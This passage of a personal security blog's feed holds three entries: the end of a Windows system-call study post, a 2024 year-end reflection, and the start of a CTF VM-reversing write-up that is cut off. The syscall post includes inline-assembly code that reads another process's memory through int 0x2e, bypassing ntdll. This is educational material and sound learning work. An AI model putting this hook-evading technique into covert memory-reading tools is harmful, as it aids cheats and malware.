<code>ntdll.dll</code>，同样来到这里</p><img src="/2025/01/21/WindowsSyscall1/2.png" class=""><p>发现这里的 <code>NtReadVirtualMemory</code> 仅仅是通过一个标志位选择走 <code>syscall</code> 指令或者 <code>int 0x2E</code> 指令。</p><p>这里的标志位在 <code>0x7ffe0000</code> 页内，是用于保存一个 <strong>_KUSER_SHARED_DATA</strong> 结构体使用的，不过这里看到指向了一个 <code>SystemCallPad </code> 保留结构，不太清楚为啥。通过中断门去调用这个好说，毕竟前面学过中断门是 r3 到 r0 的一个途径之一。</p><h2 id="syscall实现"><a href="#syscall实现" class="headerlink" title="syscall实现"></a>syscall实现</h2><p>主要来讲讲 syscall 的实现，CPU有一个 MSR 寄存器，每个 MSR寄存器都有一个 id ，叫 MSR Index。</p><table><thead><tr><th align="center">MSR</th><th align="center">Index</th></tr></thead><tbody><tr><td align="center">IA32_SYSENTER_CS</td><td align="center">174H</td></tr><tr><td align="center">IA32_SYSENTER_ESP</td><td align="center">175H</td></tr><tr><td align="center">IA32_SYSENTER_EIP</td><td align="center">176H</td></tr></tbody></table><p>来到windbg可以通过 0x176 的rdmsr命令得到系统调用入口。</p><img src="/2025/01/21/WindowsSyscall1/3.png" class=""><p>0x174 和 0x175 则分别表示进入系统调用后新的 CS 和 ESP 的值，SS 默认为 CS+8。</p><h2 id="中断门实现"><a href="#中断门实现" class="headerlink" title="中断门实现"></a>中断门实现</h2><p>直接查看 idt 表看看入口点即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !idt 0x2e</span><br><span class="line"></span><br><span class="line">Dumping IDT: 80b93000</span><br><span class="line"></span><br><span class="line">2e:83c77fea nt!KiSystemService</span><br></pre></td></tr></table></figure><hr><p>为什么说直接的 <code>syscall</code> 或者 <code>sysenter</code> 叫快速系统调用，因为中断门跳过去的过程涉及到读内存（IDT表），而直接 <code>syscall</code> 或者 <code>sysenter</code> 跳过去仅仅是读取了 <code>MSR</code> 寄存器。</p><hr><p>这里也算摸清楚了，<code>_KUSER_SHARED_DATA+0x300</code> 上存了 <code>KiIntSystemCall</code> 或 <code>KiFastSystemCall</code> 其中之一，而 <code>KiInitSystemCall</code> 就是 <code>int 0x2e;ret</code>，而另一个则是 <code>sysenter;ret</code>。</p><h2 id="Windows系统调用约定"><a href="#Windows系统调用约定" class="headerlink" title="Windows系统调用约定"></a>Windows系统调用约定</h2><p>这玩意跟之前的都不一样，其主要原因便是，Intel 给的中断门不支持传参，不像调用门那样，给定传参个数在执行 <code>call far</code> 指令的时候就会把 R3 栈中的参数全部搬到 R0 栈，那么直接在 R0 层写代码跟 R3 层写代码没什么不同了，可以使用同样类型的调用约定。</p><p>Windows 的所有系统调用都要求我们把参数按顺序排列放到一个内存中，将该内存的指针给到 EDX 寄存器。</p><p>回顾一下 Linux 的系统调用，同样也是不同于 R3 层的各种调用约定，通常参数小于五个的系统调用会依次把参数传给 <code>EBX,ECX,EDX,ESI,EDI</code> 中，而超过五个参数的系统调用则与 Windows 的做法一样，不过是将参数地址保存到了 EBX 中。</p><p>据此可以编写不依赖任何动态库的 <code>ReadProcessMemory</code> 函数。</p><p>测试程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0x12345678</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;a = %p\n&quot;</span>, &amp;a);</span><br><span class="line">    DWORD PID = GetCurrentProcessId();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PID = %d\n&quot;</span>, PID);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据该程序运行结果，编写第二个程序，通过中断门调用 <code>ReadProcessMemory</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MyReadProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCVOID lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPDWORD lpNumberOfBytesRead)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">                lea  eax, [ebp + <span class="number">0x14</span>]</span><br><span class="line">                push eax; ReturnLength</span><br><span class="line">                push[ebp + <span class="number">0x14</span>]; BufferLength</span><br><span class="line">                push[ebp + <span class="number">0x10</span>]; Buffer</span><br><span class="line">                push[ebp + <span class="number">0x0C</span>]; BaseAddress</span><br><span class="line">                push[ebp + <span class="number">0x08</span>]; ProcessHandle</span><br><span class="line">                mov  eax, <span class="number">0115</span>h</span><br><span class="line">                mov  edx, esp</span><br><span class="line">                <span class="type">int</span>  <span class="number">0x2e</span> </span><br><span class="line">                add  esp, <span class="number">20</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read=%d\n&quot;</span>,*lpNumberOfBytesRead);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD PID = <span class="number">3112</span>;</span><br><span class="line">    DWORD pBuffer;</span><br><span class="line">    DWORD reads=<span class="number">0</span>;</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, PID);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hProcess = %x \n&quot;</span>, hProcess);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;pBuffer, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">MyReadProcessMemory</span>(hProcess, (PVOID)<span class="number">0x19f82C</span>, &amp;pBuffer, <span class="number">4</span>, &amp;reads);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pBuffer = %x \n&quot;</span>, pBuffer);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="/2025/01/21/WindowsSyscall1/4.png" class=""><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：MSDN</li><li>[2]：<a href="https://www.cnblogs.com/onetrainee/p/11705191.html">https://www.cnblogs.com/onetrainee/p/11705191.html</a></li><li>[3]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_1">http://www.qfrost.com/posts/windowskernel/windows系统调用学习笔记_1</a></li></ul>]]></content>
    
    
    <summary type="html">来学习一下windows的系统调用</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="系统调用" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>2024年终总结</title>
    <link href="https://xia0ji233.github.io/2024/12/31/Summary2024/"/>
    <id>https://xia0ji233.github.io/2024/12/31/Summary2024/</id>
    <published>2024-12-31T11:00:00.000Z</published>
    <updated>2025-01-16T12:48:06.080Z</updated>
    
    <content type="html"><![CDATA[<p>2024年也快过去了，过去的目标完成了多少，现在又如何呢？</p><span id="more"></span><h2 id="2024总结"><a href="#2024总结" class="headerlink" title="2024总结"></a>2024总结</h2><div class="timeline  green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2024 </p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-05</p></div></div><div class='timeline-item-content'><ul><li>在队内师傅的带领下，开始写 LLVM 的插件，持续开发到六月份，也算给自己计算机生涯积累了一个大的项目开发经验。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-14</p></div></div><div class='timeline-item-content'><ul><li>时隔两年，再次走上 EC Finals 的舞台，感谢老师们坚持不懈的努力拿到了来之不易的一个名额，最后遗憾打铁，但是这趟上海之行依然很开心。</li></ul><p>附一段当时写的半退役感言：</p><blockquote><p>人生中最后一场以大学生身份参加的EC finals还是没能以一个较好的结局结束，不过也收获了一次较好的回忆吧。</p><p>时间线拉回到六年之前，那时的我也只不过是一个再平凡不过的高一学生，没有同龄人那样出众的智慧，所幸一次偶然的机会让我接触到了算法竞赛（感谢我高中的信息技术老师），这便一下吸引了我，在老师的帮助下，我得以今入隔壁强校进行旁听。但是也隐约感觉到这条路以我现有的能力举步维艰，最后没能打进去也是也是因为自己客观上能力不够，主观上对待还是不够认真，没能得到一个很好的结果。但是从此这也在我心中种下一个种子，我很庆幸，在迷迷茫茫的高中找准了自己的方向，高考填报志愿时，也是80个志愿直接梭哈计算机。</p><p>进入大学之后，也是非常想弥补高中时留下的遗憾，选择坚持了两年的ACM，第一年省赛，铜。但是与此同时，上了大学之后的信息差也是非常明显的，我们有将近一年半的时间甚至不知道ccpc，icpc等比赛，这里也感谢杭电的朋友们，让Jiaxing University第一次出现在了icpc的舞台上并拿到铜牌。往后也是因为自己一直不能够一直专注，基本上也都是打铁而归吧，诚然，ctf是兴趣驱动，算竞经过大一一年之后的洗礼之后已然从兴趣变成了一种执念了。虽然是一个不算很完美的结果，但是这打算竞一段段美好的回忆也足够深刻。</p></blockquote></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>02-26</p></div></div><div class='timeline-item-content'><ul><li>得知自己的考研成绩，与SUS无缘，遂开始扔简历找实习，基本碰壁，最后靠队里师傅收留，找到一个实习的机会，持续实习了半个月，后道心破碎，想着4月走调剂吧，毕竟国家线稳过的。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>03-29</p></div></div><div class='timeline-item-content'><ul><li>西湖论剑进入决赛，感谢朋友们看到抄送我的邮件（因为忘了是填了outlook邮箱），最后一天卡着点交上了报名信息。</li></ul><img src="/2024/12/31/Summary2024/1.png" class=""><p>面基了很多师傅，也在杭州的午夜进行了一次多人city walk。</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>04-15</p></div></div><div class='timeline-item-content'><ul><li>ZJCPC 差点银牌，最后还是差点罚时拿铜牌了，只能说对得起队友和自己四年在XCPC上的努力了。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>04-16</p></div></div><div class='timeline-item-content'><ul><li>山科大的调剂发了复试通知，选接受并最后拟录取了，当时的我身心俱疲，想着就这样吧。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>09-30</p></div></div><div class='timeline-item-content'><ul><li>研究生的课程和本科生的课程没什么太大的区别，便想着自己找事情做了，经过导师的同意直接出去投实习。在知道我最想去的一个岗位有hc之后，便开始认真学习相关内容了，一直到今天跨年的时候，仍对相关知识保持高强度的学习&amp;实践。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-14</p></div></div><div class='timeline-item-content'><ul><li>华为研究生网安比赛两天的线下游，拿了保底三等奖，最关键是肃清了研究生生涯中的一些主要矛盾和次要矛盾，也聊了很多，走了很多地方去玩，也是非常开心，华为之夜还抽中了耳机。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-05</p></div></div><div class='timeline-item-content'><ul><li>和Nepnep战队一起参加的强网杯，虽然能做的尽力做了，但是一想到就差几分就能拿二等奖依旧有点难过，想着如果再努力一点会不会能把 RW 的那题做出来。赛后，也是心有不甘，和队里师傅商量积极完成了赛题的复现，趁此学习了一波，希望明年不会再留这个遗憾了。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-31</p></div></div><div class='timeline-item-content'><ul><li>也就是今天吧，“玩”了很久的二次元开放世界冒险游戏，希望明年能好好“玩”。</li><li>为了这个，也是尽量学习了自己以前望而生畏的工具，去细细研究之后才发现其实没有那么可怕，甚至深入进去之后觉得就需要一个这样的工具，我想这应该就是所谓的，“曾经我看山是山，看水是水，后来我看山不是山，看水不是水，再后来我看山还是山，看水还是水”，我的认知也随着这一次次否定之否定在慢慢地螺旋上升吧。</li></ul></div></div></div><p>2024总结就是，遗憾是多的，前路也是明亮的，新的一年，仍需朝着自己的目标，努力学习。</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>往年的年终总结是有目标的，但是鉴于自己 p 人的性格，还是不写了，明确大体方向就 OK。希望新的一年，变得更加优秀，朝着更好的方向，稳步前进。</p>]]></content>
    
    
    <summary type="html">2024年终总结</summary>
    
    
    
    <category term="随笔" scheme="https://xia0ji233.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    <category term="年终总结" scheme="https://xia0ji233.github.io/categories/%E9%9A%8F%E7%AC%94/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    
  </entry>
  
  <entry>
    <title>强网杯S8决赛Reverse writeup</title>
    <link href="https://xia0ji233.github.io/2024/12/11/qwb2024_final_reverse/"/>
    <id>https://xia0ji233.github.io/2024/12/11/qwb2024_final_reverse/</id>
    <published>2024-12-11T05:00:00.000Z</published>
    <updated>2025-01-16T12:46:13.277Z</updated>
    
    <content type="html"><![CDATA[<p>复盘一下强网决赛的Reverse题。</p><span id="more"></span><h2 id="S1mpleVM"><a href="#S1mpleVM" class="headerlink" title="S1mpleVM"></a>S1mpleVM</h2><p><a href="S1mpLeVM_6d429db3ceeba8f95131c477020ee899.zip">附件下载</a></p><p>题目名字已经很明显的告诉你了，就是 vm 逆向。</p><h3 id="基本分析"><a href="#基本分析" class="headerlink" title="基本分析"></a>基本分析</h3><p>入口其实没啥，就是输入 32 长度的 passcode 然后校验，启动方式是 <code>./secret_box.exe quest</code> 命令行传参。</p><p>可以找到最关键的函数 <code>sub_140001D30</code> 就是 VM 入口。</p><img src="/2024/12/11/qwb2024_final_reverse/1.png" class=""><p>这个函数里面很明显的 vm_handler</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vmrun</span><span class="params">(<span class="type">char</span> *input, <span class="type">char</span> *vmcode)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//some defs for local variable</span></span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">  v3 = *vmcode - <span class="number">16</span>;</span><br><span class="line">  v5 = v48;</span><br><span class="line">  v6 = vmcode + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = v2;</span><br><span class="line">          v2 = (<span class="type">signed</span> <span class="type">int</span> *)*((_QWORD *)v2 + <span class="number">1</span>);</span><br><span class="line">          v7 = *v9;</span><br><span class="line">          <span class="built_in">free</span>(v9);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = v2;</span><br><span class="line">            v2 = (<span class="type">signed</span> <span class="type">int</span> *)*((_QWORD *)v2 + <span class="number">1</span>);</span><br><span class="line">            v8 = *v10;</span><br><span class="line">            <span class="built_in">free</span>(v10);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v8 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = <span class="number">0x80000000</span>;</span><br><span class="line">          v8 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = (<span class="type">signed</span> <span class="type">int</span> *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        *v11 = v7 % v8;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">LABEL_53:</span><br><span class="line">      *((_QWORD *)v11 + <span class="number">1</span>) = v2;</span><br><span class="line">      v2 = v11;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现，v3 是所谓的 opcode，v6 是 PC 指针，并且 vmcode 是实际的字节码 <code>- 0x10</code>，下面来一个个分析这些 vm 的指令。</p><p>首先是 0 号指令，做了一个较为复杂的指针操作。这里初看可能啥也看不明白，但是可以发现最下面它分配了 0x10 的空间同时又 v7 和 v8 做模运算了赋值给 v11 指向的地址。</p><p>操作完成之后又执行了 <code>*((_QWORD *)v11 + 1) = v2;</code> 和 <code>v2 = v11;</code>，如此种种的迹象显然不难让人联想到一种结构：链表。如果将划分的 0x10 字节内存进行划分，也可以看出，前八个字节存储数据，后八个字节存储指针。</p><p><code>shift+F1</code> 打开 IDA 的 <code>local type</code> 窗口，按 <code>insert</code> 键插入结构体的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkEntry</span>&#123;</span></span><br><span class="line">    <span class="type">signed</span> val;</span><br><span class="line">    LinkEntry * next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 v11 和 v2 定义修改之后，IDA 将展示如下的伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line"><span class="keyword">if</span> ( v2 )</span><br><span class="line">&#123;</span><br><span class="line">    v9 = &amp;v2-&gt;val;</span><br><span class="line">    v2 = v2-&gt;next;</span><br><span class="line">    v7 = *v9;</span><br><span class="line">    <span class="built_in">free</span>(v9);</span><br><span class="line">    <span class="keyword">if</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">        v10 = &amp;v2-&gt;val;</span><br><span class="line">        v2 = v2-&gt;next;</span><br><span class="line">        v8 = *v10;</span><br><span class="line">        <span class="built_in">free</span>(v10);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        v8 = <span class="number">0x80000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    v7 = <span class="number">0x80000000</span>;</span><br><span class="line">    v8 = <span class="number">0x80000000</span>;</span><br><span class="line">&#125;</span><br><span class="line">v11 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">v11-&gt;val = v7 % v8;</span><br><span class="line"><span class="keyword">goto</span> LABEL_53;</span><br></pre></td></tr></table></figure><p>可以说，基本上是一目了然了，并且据此可以联想到一个栈的结果，将两个数 push 进栈中，再弹出来做计算，计算的结果重新入栈。</p><p>这里可以将所有 malloc 返回值接收的变量都改成 <code>LinkEntry *</code> 类型。</p><p>此时再来观察整个反编译的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span 